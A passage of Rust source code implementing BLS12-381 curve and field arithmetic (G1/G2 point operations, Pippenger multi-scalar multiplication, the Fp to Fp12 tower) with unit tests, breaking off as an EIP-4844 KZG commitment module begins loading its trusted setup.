        // dbl-2007-bl (a = 0)
        let a = self.x.square();
        let b = self.y.square();
        let c = b.square();
        let xb = self.x.add(&b);
        let d = xb.square().sub(&a).sub(&c).double();
        let e = a.double().add(&a);
        let f = e.square();
        let x3 = f.sub(&d.double());
        let y3 = e.mul(&d.sub(&x3)).sub(&c.double().double().double());
        let z3 = self.y.double().mul(&self.z);
        G1Jac { x: x3, y: y3, z: z3 }
    }

    fn add_affine(&self, q: &G1Affine) -> G1Jac {
        if q.infinity {
            return self.clone();
        }
        if self.is_identity() {
            return G1Jac::from_affine(q);
        }
        // madd-2007-bl with Z2 = 1
        let z1z1 = self.z.square();
        let u2 = q.x.mul(&z1z1);
        let s2 = q.y.mul(&self.z).mul(&z1z1);
        let h = u2.sub(&self.x);
        if h.is_zero() {
            if self.y == s2 {
                return self.double();
            }
            return Self::identity();
        }
        let hh = h.square();
        let i = hh.double().double();
        let j = h.mul(&i);
        let r = s2.sub(&self.y).double();
        let v = self.x.mul(&i);
        let x3 = r.square().sub(&j).sub(&v.double());
        let y3 = r.mul(&v.sub(&x3)).sub(&self.y.mul(&j).double());
        let z3 = self.z.add(&h).square().sub(&z1z1).sub(&hh);
        G1Jac { x: x3, y: y3, z: z3 }
    }

    fn to_affine(&self) -> G1Affine {
        if self.is_identity() {
            return G1Affine::identity();
        }
        let zinv = self.z.inv().unwrap();
        let zinv2 = zinv.square();
        G1Affine {
            x: self.x.mul(&zinv2),
            y: self.y.mul(&zinv2.mul(&zinv)),
            infinity: false,
        }
    }
}

/// Pippenger multi-scalar multiplication over G1. Scalars are full-width (mod r applied by caller if desired).
pub fn msm_g1(points: &[G1Affine], scalars: &[BigUint]) -> G1Affine {
    assert_eq!(points.len(), scalars.len());
    if points.is_empty() {
        return G1Affine::identity();
    }
    if points.len() == 1 {
        return points[0].mul(&scalars[0]);
    }
    const W: usize = 5; // window bits
    let nbits = 255;
    let num_windows = (nbits + W - 1) / W;
    let mut acc = G1Jac::identity();

    for w in (0..num_windows).rev() {
        // bucket accumulate: 2^W buckets (index 0 unused)
        let nbuckets = 1 << W;
        let mut buckets: Vec<G1Jac> = vec![G1Jac::identity(); nbuckets];
        for (p, s) in points.iter().zip(scalars.iter()) {
            if p.infinity || s.is_zero() {
                continue;
            }
            let window = {
                // extract W bits starting at w*W from BE representation
                let bytes = s.to_bytes_be();
                let bit_len = bytes.len() * 8;
                let bit_index = w * W;
                if bit_index >= bit_len {
                    continue;
                }
                let mut val = 0u32;
                for b in 0..W {
                    let bi = bit_index + b;
                    if bi >= bit_len { break; }
                    let byte_i = bytes.len() - 1 - bi / 8;
                    let bit_i = bi % 8;
                    val |= (((bytes[byte_i] >> bit_i) & 1) as u32) << b;
                }
                val as usize
            };
            if window == 0 {
                continue;
            }
            buckets[window] = buckets[window].add_affine(p);
        }
        // sum bucket chain
        let mut running = G1Jac::identity();
        for j in (1..nbuckets).rev() {
            running = running.add_affine(&buckets[j].to_affine());
            acc = acc.add_affine(&running.to_affine());
        }
        if w > 0 {
            for _ in 0..W {
                acc = acc.double();
            }
        }
    }
    acc.to_affine()
}

/// Pippenger MSM over G2.
pub fn msm_g2(points: &[G2Affine], scalars: &[BigUint]) -> G2Affine {
    assert_eq!(points.len(), scalars.len());
    if points.is_empty() {
        return G2Affine::identity();
    }
    if points.len() == 1 {
        return points[0].mul(&scalars[0]);
    }
    const W: usize = 4;
    let nbits = 255;
    let num_windows = (nbits + W - 1) / W;
    let mut acc = G2Affine::identity();

    for w in (0..num_windows).rev() {
        let nbuckets = 1 << W;
        let mut buckets: Vec<G2Affine> = vec![G2Affine::identity(); nbuckets];
        for (p, s) in points.iter().zip(scalars.iter()) {
            if p.infinity || s.is_zero() {
                continue;
            }
            let bytes = s.to_bytes_be();
            let bit_len = bytes.len() * 8;
            let bit_index = w * W;
            if bit_index >= bit_len {
                continue;
            }
            let mut val = 0u32;
            for b in 0..W {
                let bi = bit_index + b;
                if bi >= bit_len { break; }
                let byte_i = bytes.len() - 1 - bi / 8;
                let bit_i = bi % 8;
                val |= (((bytes[byte_i] >> bit_i) & 1) as u32) << b;
            }
            if val == 0 {
                continue;
            }
            buckets[val as usize] = buckets[val as usize].add(p);
        }
        let mut running = G2Affine::identity();
        for j in (1..nbuckets).rev() {
            running = running.add(&buckets[j]);
            acc = acc.add(&running);
        }
        if w > 0 {
            for _ in 0..W {
                acc = acc.double();
            }
        }
    }
    acc
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn generators_on_curve_and_in_subgroup() {
        let g = g1_generator();
        assert!(g.is_on_curve());
        assert!(g.is_in_subgroup());
        let h = g2_generator();
        assert!(h.is_on_curve());
        assert!(h.is_in_subgroup());
    }

    #[test]
    fn g1_group_laws() {
        let g = g1_generator();
        let two_g = g.double();
        assert_eq!(g.add(&g), two_g);
        assert_eq!(g.add(&g.neg()), G1Affine::identity());
        assert_eq!(g.add(&G1Affine::identity()), g);
        // scalar consistency: 5G via mul vs repeated add
        let five = BigUint::from(5u32);
        let m = g.mul(&five);
        assert_eq!(m, two_g.add(&two_g).add(&g));
        // (r+1)P == P
        let k = r_suborder() + 1u32;
        assert_eq!(g.mul(&k), g);
    }

    #[test]
    fn g1_encoding_roundtrip() {
        let g = g1_generator();
        let enc = g.encode128();
        let dec = G1Affine::decode128(&enc).unwrap();
        assert_eq!(g, dec);
        // compressed roundtrip
        let comp = g.compress();
        let dec2 = G1Affine::decompress(&comp).unwrap();
        assert_eq!(g, dec2);
        // identity encodings
        let inf = G1Affine::identity();
        assert!(G1Affine::decode128(&inf.encode128()).unwrap().infinity);
        let c = inf.compress();
        assert!(G1Affine::decompress(&c).unwrap().infinity);
    }

    #[test]
    fn g2_group_laws_and_encoding() {
        let h = g2_generator();
        assert_eq!(h.add(&h), h.double());
        assert_eq!(h.add(&h.neg()), G2Affine::identity());
        let comp = h.compress();
        let dec = G2Affine::decompress(&comp).unwrap();
        assert_eq!(h, dec);
        let enc = h.encode256();
        assert_eq!(G2Affine::decode256(&enc).unwrap(), h);
        // (r+1)H == H
        let k = r_suborder() + 1u32;
        assert_eq!(h.mul(&k), h);
    }

    #[test]
    fn msm_matches_naive() {
        let g = g1_generator();
        let pts = vec![g.clone(), g.double(), g.double().double(), g.mul(&BigUint::from(7u32))];
        let scs = vec![BigUint::from(3u32), BigUint::from(11u32), BigUint::from(2u32), BigUint::from(5u32)];
        let pipp = msm_g1(&pts, &scs);
        let naive = pts
            .iter()
            .zip(scs.iter())
            .fold(G1Affine::identity(), |acc, (p, s)| acc.add(&p.mul(s)));
        assert_eq!(pipp, naive);
    }
}
```

```rust
//! Fp: the 381-bit BLS12-381 base prime field (arbitrary-precision backend).

use num_bigint::BigUint;
use num_traits::{One, Zero};
use std::sync::OnceLock;

pub const MODULUS_HEX: &str = "1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab";

pub fn modulus() -> BigUint {
    static P: OnceLock<BigUint> = OnceLock::new();
    P.get_or_init(|| BigUint::parse_bytes(MODULUS_HEX.as_bytes(), 16).unwrap())
        .clone()
}

pub fn r_suborder() -> BigUint {
    static R: OnceLock<BigUint> = OnceLock::new();
    R.get_or_init(|| BigUint::parse_bytes(b"73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001", 16).unwrap())
        .clone()
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Fp(pub BigUint);

impl Fp {
    pub fn zero() -> Self { Fp(BigUint::zero()) }
    pub fn one() -> Self { Fp(BigUint::one()) }
    pub fn is_zero(&self) -> bool { self.0.is_zero() }

    pub fn from_u64(v: u64) -> Self {
        Fp(BigUint::from(v) % modulus())
    }

    /// Interpret big-endian bytes (any length) as an integer mod p.
    pub fn from_be_bytes(bytes: &[u8]) -> Self {
        Fp(BigUint::from_bytes_be(bytes) % modulus())
    }

    /// Canonical 48-byte big-endian encoding.
    pub fn to_be48(&self) -> [u8; 48] {
        let b = self.0.to_bytes_be();
        let mut out = [0u8; 48];
        let start = 48usize.saturating_sub(b.len());
        out[start..].copy_from_slice(&b);
        out
    }

    pub fn from_be48(bytes: &[u8]) -> Result<Self, String> {
        if bytes.len() != 48 {
            return Err("Fp: need 48 bytes".into());
        }
        let v = BigUint::from_bytes_be(bytes);
        if v >= modulus() {
            return Err("Fp: value >= modulus".into());
        }
        Ok(Fp(v))
    }

    pub fn add(&self, o: &Fp) -> Fp { Fp((&self.0 + &o.0) % modulus()) }
    pub fn sub(&self, o: &Fp) -> Fp {
        let a = &self.0;
        let b = &o.0;
        Fp(if a >= b { a - b } else { modulus() - (b - a) })
    }
    pub fn mul(&self, o: &Fp) -> Fp { Fp((&self.0 * &o.0) % modulus()) }
    pub fn neg(&self) -> Fp {
        if self.0.is_zero() { Fp::zero() } else { Fp(modulus() - &self.0) }
    }
    pub fn square(&self) -> Fp { self.mul(self) }
    pub fn double(&self) -> Fp { self.add(self) }

    pub fn pow(&self, exp: &BigUint) -> Fp {
        let mut result = Fp::one();
        let bits: Vec<bool> = exp.to_bytes_be().iter().flat_map(|b| (0..8).rev().map(move |i| (b >> i) & 1 == 1)).collect();
        for bit in bits {
            result = result.square();
            if bit {
                result = result.mul(self);
            }
        }
        result
    }

    /// Multiplicative inverse via Fermat (p is prime).
    pub fn inv(&self) -> Result<Fp, String> {
        if self.is_zero() {
            return Err("Fp: inverse of zero".into());
        }
        let e = modulus() - 2u8;
        Ok(self.pow(&e))
    }

    /// Square root (p ≡ 3 mod 4): y = c^((p+1)/4), verify.
    pub fn sqrt(&self) -> Result<Fp, String> {
        if self.is_zero() {
            return Ok(Fp::zero());
        }
        // (p+1)/4
        let e = (modulus() + 1u8) >> 2u32;
        let y = self.pow(&e);
        if y.square() == *self {
            Ok(y)
        } else {
            Err("Fp: not a quadratic residue".into())
        }
    }

    pub fn is_quadratic_residue(&self) -> bool {
        if self.is_zero() { return true; }
        // c^((p-1)/2) == 1
        let e = (modulus() - 1u8) >> 1u32;
        self.pow(&e) == Fp::one()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fp_basic() {
        let a = Fp::from_u64(7);
        let b = Fp::from_u64(5);
        assert_eq!(a.add(&b), Fp::from_u64(12));
        assert_eq!(a.mul(&b), Fp::from_u64(35));
        assert_eq!(a.sub(&b), Fp::from_u64(2));
        assert_eq!(b.sub(&a).add(&a), b);
        assert_eq!(a.inv().unwrap().mul(&a), Fp::one());
    }

    #[test]
    fn fp_sqrt() {
        let a = Fp::from_u64(9);
        let r = a.sqrt().unwrap();
        assert_eq!(r.square(), a);
        assert!(Fp::from_u64(7).sqrt().is_err() || Fp::from_u64(7).sqrt().unwrap().square() == Fp::from_u64(7));
        // non-residue check
        let mut c = Fp::from_u64(2);
        while c.is_quadratic_residue() {
            c = c.add(&Fp::one());
        }
        assert!(c.sqrt().is_err());
    }

    #[test]
    fn fp_modulus_shape() {
        // p is 381 bits: top byte 0x1a, 48 bytes total
        let p = modulus().to_bytes_be();
        assert_eq!(p.len(), 48);
        assert_eq!(p[0], 0x1a);
    }
}

/// Fr: the scalar field (subgroup order r) — where KZG polynomial
/// coefficients, evaluations, domains and challenges live.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Fr(pub BigUint);

impl Fr {
    pub fn zero() -> Self { Fr(BigUint::zero()) }
    pub fn one() -> Self { Fr(BigUint::one()) }
    pub fn is_zero(&self) -> bool { self.0.is_zero() }

    pub fn from_u64(v: u64) -> Self { Fr(BigUint::from(v) % r_suborder()) }

    /// Canonical big-endian 32-byte interpretation; errors if >= r.
    pub fn from_be32_canonical(bytes: &[u8]) -> Result<Self, String> {
        if bytes.len() != 32 {
            return Err("Fr: need 32 bytes".into());
        }
        let v = BigUint::from_bytes_be(bytes);
        if v >= r_suborder() {
            return Err("Fr: value >= subgroup order (BLS_MODULUS)".into());
        }
        Ok(Fr(v))
    }

    /// Reduce arbitrary bytes mod r.
    pub fn from_be_bytes_reduced(bytes: &[u8]) -> Self {
        Fr(BigUint::from_bytes_be(bytes) % r_suborder())
    }

    pub fn to_be32(&self) -> [u8; 32] {
        let b = self.0.to_bytes_be();
        let mut out = [0u8; 32];
        let start = 32usize.saturating_sub(b.len());
        out[start..].copy_from_slice(&b);
        out
    }

    pub fn add(&self, o: &Fr) -> Fr { Fr((&self.0 + &o.0) % r_suborder()) }
    pub fn sub(&self, o: &Fr) -> Fr {
        let a = &self.0;
        let b = &o.0;
        Fr(if a >= b { a - b } else { r_suborder() - (b - a) })
    }
    pub fn mul(&self, o: &Fr) -> Fr { Fr((&self.0 * &o.0) % r_suborder()) }
    pub fn neg(&self) -> Fr {
        if self.0.is_zero() { Fr::zero() } else { Fr(r_suborder() - &self.0) }
    }
    pub fn square(&self) -> Fr { self.mul(self) }
    pub fn double(&self) -> Fr { self.add(self) }

    pub fn pow(&self, exp: &BigUint) -> Fr {
        let mut result = Fr::one();
        let bits: Vec<bool> = exp.to_bytes_be().iter().flat_map(|b| (0..8).rev().map(move |i| (b >> i) & 1 == 1)).collect();
        for bit in bits {
            result = result.square();
            if bit {
                result = result.mul(self);
            }
        }
        result
    }

    pub fn inv(&self) -> Result<Fr, String> {
        if self.is_zero() {
            return Err("Fr: inverse of zero".into());
        }
        let e = r_suborder() - 2u8;
        Ok(self.pow(&e))
    }
}

#[cfg(test)]
mod fr_tests {
    use super::*;

    #[test]
    fn fr_basic() {
        let a = Fr::from_u64(7);
        let b = Fr::from_u64(5);
        assert_eq!(a.add(&b), Fr::from_u64(12));
        assert_eq!(a.mul(&b), Fr::from_u64(35));
        assert_eq!(a.inv().unwrap().mul(&a), Fr::one());
        assert_eq!(r_suborder().bits(), 255);
    }

    #[test]
    fn fr_root_of_unity() {
        // ω = 7^((r-1)/4096) must have exact order 4096 in Fr
        let e = (r_suborder() - 1u8) / BigUint::from(4096u64);
        let w = Fr::from_u64(7).pow(&e);
        assert_eq!(w.pow(&BigUint::from(4096u64)), Fr::one());
        assert_ne!(w.pow(&BigUint::from(2048u64)), Fr::one());
    }
}
```

```rust
//! Fp2 = Fp[u]/(u^2 + 1) — BLS12-381 quadratic extension.

use super::fp::Fp;

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Fp2 {
    pub c0: Fp,
    pub c1: Fp,
}

impl Fp2 {
    pub fn zero() -> Self { Fp2 { c0: Fp::zero(), c1: Fp::zero() } }
    pub fn one() -> Self { Fp2 { c0: Fp::one(), c1: Fp::zero() } }
    pub fn is_zero(&self) -> bool { self.c0.is_zero() && self.c1.is_zero() }

    pub fn new(c0: Fp, c1: Fp) -> Self { Fp2 { c0, c1 } }

    pub fn add(&self, o: &Fp2) -> Fp2 { Fp2::new(self.c0.add(&o.c0), self.c1.add(&o.c1)) }
    pub fn sub(&self, o: &Fp2) -> Fp2 { Fp2::new(self.c0.sub(&o.c0), self.c1.sub(&o.c1)) }
    pub fn neg(&self) -> Fp2 { Fp2::new(self.c0.neg(), self.c1.neg()) }
    pub fn double(&self) -> Fp2 { self.add(self) }

    pub fn mul(&self, o: &Fp2) -> Fp2 {
        // (a0 + a1 u)(b0 + b1 u) = (a0 b0 - a1 b1) + (a0 b1 + a1 b0) u   [u^2 = -1]
        let t0 = self.c0.mul(&o.c0);
        let t1 = self.c1.mul(&o.c1);
        let t2 = self.c0.mul(&o.c1);
        let t3 = self.c1.mul(&o.c0);
        Fp2::new(t0.sub(&t1), t2.add(&t3))
    }

    pub fn square(&self) -> Fp2 {
        // (a0 + a1 u)^2 = (a0+a1)(a0-a1) + 2 a0 a1 u
        let s = self.c0.add(&self.c1);
        let d = self.c0.sub(&self.c1);
        Fp2::new(s.mul(&d), self.c0.mul(&self.c1).double())
    }

    pub fn conjugate(&self) -> Fp2 { Fp2::new(self.c0.clone(), self.c1.neg()) }

    pub fn mul_fp(&self, s: &Fp) -> Fp2 { Fp2::new(self.c0.mul(s), self.c1.mul(s)) }

    pub fn inv(&self) -> Result<Fp2, String> {
        // 1/(a+bu) = conj / norm, norm = a^2 + b^2  (since u^2 = -1)
        let norm = self.c0.square().add(&self.c1.square());
        let ninv = norm.inv()?;
        Ok(self.conjugate().mul_fp(&ninv))
    }

    pub fn pow(&self, exp: &num_bigint::BigUint) -> Fp2 {
        let mut r = Fp2::one();
        let bits: Vec<bool> = exp.to_bytes_be().iter().flat_map(|b| (0..8).rev().map(move |i| (b >> i) & 1 == 1)).collect();
        for bit in bits {
            r = r.square();
            if bit {
                r = r.mul(self);
            }
        }
        r
    }

    /// Square root in Fp2 (p ≡ 3 mod 4). Algorithm:
    /// b=0 → Fp sqrt; else n = sqrt(a^2+b^2) in Fp, x = sqrt((a+n)/2), y = b/(2x).
    pub fn sqrt(&self) -> Result<Fp2, String> {
        if self.is_zero() {
            return Ok(Fp2::zero());
        }
        if self.c1.is_zero() {
            let r = self.c0.sqrt()?;
            return Ok(Fp2::new(r, Fp::zero()));
        }
        let norm = self.c0.square().add(&self.c1.square());
        let n = norm.sqrt()?;
        let half = Fp::from_u64(2).inv()?;
        // x² = (a+n)/2 or (a-n)/2 — try both
        let mut x = self.c0.add(&n).mul(&half).sqrt();
        if x.is_err() {
            x = self.c0.sub(&n).mul(&half).sqrt();
        }
        let x = x.map_err(|_| "Fp2 sqrt: not a quadratic residue".to_string())?;
        if x.is_zero() {
            return Err("Fp2 sqrt: degenerate".into());
        }
        let y = self.c1.mul(&Fp::from_u64(2).mul(&x).inv()?);
        let r = Fp2::new(x, y);
        if r.square() == *self {
            Ok(r)
        } else {
            Err("Fp2 sqrt: not a quadratic residue".into())
        }
    }

    pub fn to_be96(&self) -> [u8; 96] {
        let mut out = [0u8; 96];
        out[..48].copy_from_slice(&self.c0.to_be48());
        out[48..].copy_from_slice(&self.c1.to_be48());
        out
    }

    pub fn from_be96(bytes: &[u8]) -> Result<Self, String> {
        if bytes.len() != 96 {
            return Err("Fp2: need 96 bytes".into());
        }
        Ok(Fp2::new(Fp::from_be48(&bytes[..48])?, Fp::from_be48(&bytes[48..])?))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fp2_ops() {
        let a = Fp2::new(Fp::from_u64(3), Fp::from_u64(4));
        let b = Fp2::new(Fp::from_u64(1), Fp::from_u64(2));
        let prod = a.mul(&b);
        // (3+4u)(1+2u) = 3 + 6u + 4u + 8u^2 = (3-8) + 10u = -5 + 10u
        assert_eq!(prod, Fp2::new(Fp::from_u64(5).neg(), Fp::from_u64(10)));
        assert_eq!(prod.inv().unwrap().mul(&prod), Fp2::one());
        assert_eq!(a.square(), a.mul(&a));
    }

    #[test]
    fn fp2_sqrt() {
        // (1 + 1u)^2 = 1 + 2u + u^2 = 2u  → sqrt(2u) = 1+u
        let c = Fp2::new(Fp::zero(), Fp::from_u64(2));
        let r = c.sqrt().unwrap();
        assert_eq!(r, Fp2::new(Fp::one(), Fp::one()));
        // random QR case
        let t = Fp2::new(Fp::from_u64(7), Fp::from_u64(11));
        let sq = t.square();
        let r = sq.sqrt().unwrap();
        assert!(r == t || r == t.neg());
    }
}
```

```rust
//! Fp6 = Fp2[v]/(v^3 - (1+u)) and Fp12 = Fp6[w]/(w^2 - v) — the BLS12-381 tower.

use super::fp2::Fp2;

/// ξ = 1 + u  (the Fp6 defining element: v^3 = ξ)
pub fn xi() -> Fp2 {
    Fp2::new(Fp2::one().c0, Fp2::one().c1.add(&Fp2::one().c0))
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Fp6 {
    pub c0: Fp2,
    pub c1: Fp2,
    pub c2: Fp2,
}

impl Fp6 {
    pub fn zero() -> Self { Fp6 { c0: Fp2::zero(), c1: Fp2::zero(), c2: Fp2::zero() } }
    pub fn one() -> Self { Fp6 { c0: Fp2::one(), c1: Fp2::zero(), c2: Fp2::zero() } }
    pub fn is_zero(&self) -> bool { self.c0.is_zero() && self.c1.is_zero() && self.c2.is_zero() }

    pub fn new(c0: Fp2, c1: Fp2, c2: Fp2) -> Self { Fp6 { c0, c1, c2 } }

    pub fn add(&self, o: &Fp6) -> Fp6 {
        Fp6::new(self.c0.add(&o.c0), self.c1.add(&o.c1), self.c2.add(&o.c2))
    }
    pub fn sub(&self, o: &Fp6) -> Fp6 {
        Fp6::new(self.c0.sub(&o.c0), self.c1.sub(&o.c1), self.c2.sub(&o.c2))
    }
    pub fn neg(&self) -> Fp6 { Fp6::new(self.c0.neg(), self.c1.neg(), self.c2.neg()) }

    pub fn mul(&self, o: &Fp6) -> Fp6 {
        // Karatsuba-style with reduction v^3 = ξ
        let t0 = self.c0.mul(&o.c0);
        let t1 = self.c1.mul(&o.c1);
        let t2 = self.c2.mul(&o.c2);
        let s01 = self.c0.add(&self.c1).mul(&o.c0.add(&o.c1)).sub(&t0).sub(&t1); // a0b1+a1b0
        let s12 = self.c1.add(&self.c2).mul(&o.c1.add(&o.c2)).sub(&t1).sub(&t2); // a1b2+a2b1
        let s02 = self.c0.add(&self.c2).mul(&o.c0.add(&o.c2)).sub(&t0).sub(&t2); // a0b2+a2b0
        let k = xi();
        Fp6::new(
            t0.add(&s12.mul(&k)),
            s01.add(&t2.mul(&k)),
            s02.add(&t1),
        )
    }

    pub fn square(&self) -> Fp6 { self.mul(self) }

    pub fn mul_fp2(&self, s: &Fp2) -> Fp6 {
        Fp6::new(self.c0.mul(s), self.c1.mul(s), self.c2.mul(s))
    }

    pub fn inv(&self) -> Result<Fp6, String> {
        // Standard Fp6 inversion (cf. zkcrypto/pairing):
        let k = xi();
        let a0 = self.c0.square().sub(&k.mul(&self.c1.mul(&self.c2)));
        let a1 = k.mul(&self.c2.square()).sub(&self.c0.mul(&self.c1));
        let a2 = self.c1.square().sub(&self.c0.mul(&self.c2));
        let denom = self.c0.mul(&a0)
            .add(&k.mul(&self.c2.mul(&a1).add(&self.c1.mul(&a2))));
        let d = denom.inv()?;
        Ok(Fp6::new(a0.mul(&d), a1.mul(&d), a2.mul(&d)))
    }

    pub fn pow(&self, exp: &num_bigint::BigUint) -> Fp6 {
        let mut r = Fp6::one();
        let bits: Vec<bool> = exp.to_bytes_be().iter().flat_map(|b| (0..8).rev().map(move |i| (b >> i) & 1 == 1)).collect();
        for bit in bits {
            r = r.square();
            if bit {
                r = r.mul(self);
            }
        }
        r
    }

    /// Embed an Fp2 element (c0 + c1·0·v + 0·v^2).
    pub fn from_fp2(a: &Fp2) -> Fp6 { Fp6::new(a.clone(), Fp2::zero(), Fp2::zero()) }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Fp12 {
    pub c0: Fp6,
    pub c1: Fp6,
}

impl Fp12 {
    pub fn zero() -> Self { Fp12 { c0: Fp6::zero(), c1: Fp6::zero() } }
    pub fn one() -> Self { Fp12 { c0: Fp6::one(), c1: Fp6::zero() } }
    pub fn is_zero(&self) -> bool { self.c0.is_zero() && self.c1.is_zero() }

    pub fn new(c0: Fp6, c1: Fp6) -> Self { Fp12 { c0, c1 } }

    pub fn add(&self, o: &Fp12) -> Fp12 { Fp12::new(self.c0.add(&o.c0), self.c1.add(&o.c1)) }
    pub fn sub(&self, o: &Fp12) -> Fp12 { Fp12::new(self.c0.sub(&o.c0), self.c1.sub(&o.c1)) }
    pub fn neg(&self) -> Fp12 { Fp12::new(self.c0.neg(), self.c1.neg()) }

    pub fn mul(&self, o: &Fp12) -> Fp12 {
        // (a0 + a1 w)(b0 + b1 w) = (a0b0 + v·a1b1) + (a0b1 + a1b0) w   [w^2 = v]
        let t0 = self.c0.mul(&o.c0);
        let t1 = self.c1.mul(&o.c1);
        let v_t1 = Fp6::new(t1.c2.mul(&xi()), t1.c0.clone(), t1.c1.clone()); // v·t1 = ξ·c2 + c0·v + c1·v²
        Fp12::new(t0.add(&v_t1), self.c0.mul(&o.c1).add(&self.c1.mul(&o.c0)))
    }

    pub fn square(&self) -> Fp12 { self.mul(self) }

    pub fn double(&self) -> Fp12 { self.add(self) }

    pub fn mul_fp6(&self, s: &Fp6) -> Fp12 { Fp12::new(self.c0.mul(s), self.c1.mul(s)) }

    /// p^6-th power = conjugation over Fp6 (c0 - c1·w).
    pub fn conjugate(&self) -> Fp12 { Fp12::new(self.c0.clone(), self.c1.neg()) }

    pub fn inv(&self) -> Result<Fp12, String> {
        // 1/(a0 + a1 w) = (a0 - a1 w) / (a0^2 - v a1^2)
        let d = self.c0.square().sub(&mul_v(&self.c1.square()));
        let dinv = d.inv()?;
        Ok(Fp12::new(self.c0.mul(&dinv), self.c1.mul(&dinv).neg()))
    }

    pub fn pow(&self, exp: &num_bigint::BigUint) -> Fp12 {
        let mut r = Fp12::one();
        let bits: Vec<bool> = exp.to_bytes_be().iter().flat_map(|b| (0..8).rev().map(move |i| (b >> i) & 1 == 1)).collect();
        for bit in bits {
            r = r.square();
            if bit {
                r = r.mul(self);
            }
        }
        r
    }
}

/// multiply an Fp6 element by v (the Fp6 generator): v·(c0 + c1 v + c2 v^2) = c2·ξ + c0·v + c1·v^2
pub fn mul_v(a: &Fp6) -> Fp6 {
    Fp6::new(a.c2.mul(&xi()), a.c0.clone(), a.c1.clone())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fp::Fp;

    #[test]
    fn fp6_fp12_ring_ops() {
        let a = Fp6::new(
            Fp2::new(Fp::from_u64(1), Fp::from_u64(2)),
            Fp2::new(Fp::from_u64(3), Fp::from_u64(4)),
            Fp2::new(Fp::from_u64(5), Fp::from_u64(6)),
        );
        let b = Fp6::new(
            Fp2::new(Fp::from_u64(7), Fp::from_u64(8)),
            Fp2::new(Fp::from_u64(9), Fp::from_u64(10)),
            Fp2::new(Fp::from_u64(11), Fp::from_u64(12)),
        );
        assert_eq!(a.mul(&b).inv().unwrap().mul(&a.mul(&b)), Fp6::one());
        assert_eq!(a.mul(&b), b.mul(&a));

        let x = Fp12::new(a.clone(), b.clone());
        let y = Fp12::new(b, a);
        let p = x.mul(&y);
        assert_eq!(p.inv().unwrap().mul(&p), Fp12::one());
        assert_eq!(x.mul(&y), y.mul(&x));
        assert_eq!(x.conjugate().conjugate(), x);
    }

    #[test]
    fn mul_v_consistent() {
        let a = Fp6::new(
            Fp2::new(Fp::from_u64(1), Fp::from_u64(0)),
            Fp2::new(Fp::from_u64(2), Fp::from_u64(0)),
            Fp2::new(Fp::from_u64(3), Fp::from_u64(0)),
        );
        // v * a must equal Fp6 mul with v embedded: v = (0, 1, 0)
        let v = Fp6::new(Fp2::zero(), Fp2::one(), Fp2::zero());
        assert_eq!(mul_v(&a), a.mul(&v));
    }
}
```

```rust
//! KZG polynomial commitments (EIP-4844) over BLS12-381, with the REAL
//! trusted setup from the Ethereum KZG ceremony (c-kzg-4844 format).
//!
//! Exact c-kzg-4844 semantics (verified against the C source):
//! - evaluation domain: ω = 7^((p-1)/4096), nodes ω^j (j = 0..4095, natural order)
//! - blob field element a_i is the evaluation at node ω^bitrev12(i)
//!   (c-kzg keeps everything bit-reversed; here we transpose to natural order)
//! - Lagrange setup point for node ω^j sits at file index 2j (even indices =
//!   the 4096-subgroup; odd file entries belong to the EIP-7594 anti-coset)
//! - sidecar challenge: sha256("FSBLOBVERIFY_V1_" || 0u64be || 4096u64be || blob || commitment) mod r

use crate::curve::{msm_g1, G1Affine, G2Affine};
use crate::fp::{r_suborder, Fr, Fp};
use crate::pairing::kzg_pairing_check;
use num_bigint::BigUint;
use num_traits::Zero;

pub const FIELD_ELEMENTS_PER_BLOB: usize = 4096;
pub const BYTES_PER_FIELD_ELEMENT: usize = 32;
pub const BLOB_SIZE: usize = FIELD_ELEMENTS_PER_BLOB * BYTES_PER_FIELD_ELEMENT;
pub const COMMITMENT_SIZE: usize = 48;
pub const PROOF_SIZE: usize = 48;

const SETUP_BIN: &[u8] = include_bytes!("trusted_setup.bin");

pub struct TrustedSetup {
    /// Lagrange G1 points in natural node order: g1_subgroup[j] ↔ node ω^j.
    pub g1_subgroup: Vec<G1Affine>,
    /// Monomial G2 powers [τ^i]_2 (g2[0] = G2 generator).
    pub g2_monomial: Vec<G2Affine>,
}

fn load_setup() -> Result<TrustedSetup, String> {
    const MAGIC: &[u8; 7] = b"RRXKZG1";
    if SETUP_BIN.len() < 15 || SETUP_BIN[..7] != *MAGIC {
        return Err(
            "trusted_setup.bin missing or invalid (run: cargo run -p rrx-bls381 --bin gen_setup)"
                .into(),
        );
    }
    let g1n = u32::from_be_bytes([SETUP_BIN[7], SETUP_BIN[8], SETUP_BIN[9], SETUP_BIN[10]]) as usize;
    let g2n = u32::from_be_bytes([SETUP_BIN[11], SETUP_BIN[12], SETUP_BIN[13], SETUP_BIN[14]]) as usize;
    let mut off = 15;
    let mut file_g1 = Vec::with_capacity(g1n);
    for _ in 0..g1n {
        let x = Fp::from_be48(&SETUP_BIN[off..off + 48])?;
        let y = Fp::from_be48(&SETUP_BIN[off + 48..off + 96])?;
        file_g1.push(G1Affine { x, y, infinity: false });
        off += 96;
    }
    let mut g2_monomial = Vec::with_capacity(g2n);
    for _ in 0..g2n {
        let xc0 = Fp::from_be48(&SETUP_BIN[off..off + 48])?;
        let xc1 = Fp::from_be48(&SETUP_BIN[off + 48..off + 96])?;
        let yc0 = Fp::from_be48(&SETUP_BIN[off + 96..off + 144])?;
        let yc1 = Fp::from_be48(&SETUP_BIN[off + 144..off + 192])?;
        g2_monomial.push(G2Affine {
            x: crate::Fp2::new(xc0, xc1),
            y: crate::Fp2::new(yc0, yc1),
            infinity: false,
        });
        off += 192;
    }
    // file lagrange[i] ↔ node ω^i (natural order, ω = the 4096th root of
    // unity in Fr) — c-kzg bit-reverses internally; we keep natural order.
    Ok(TrustedSetup { g1_subgroup: file_g1, g2_monomial })
}

pub fn setup() -> Result<&'static TrustedSetup, String> {
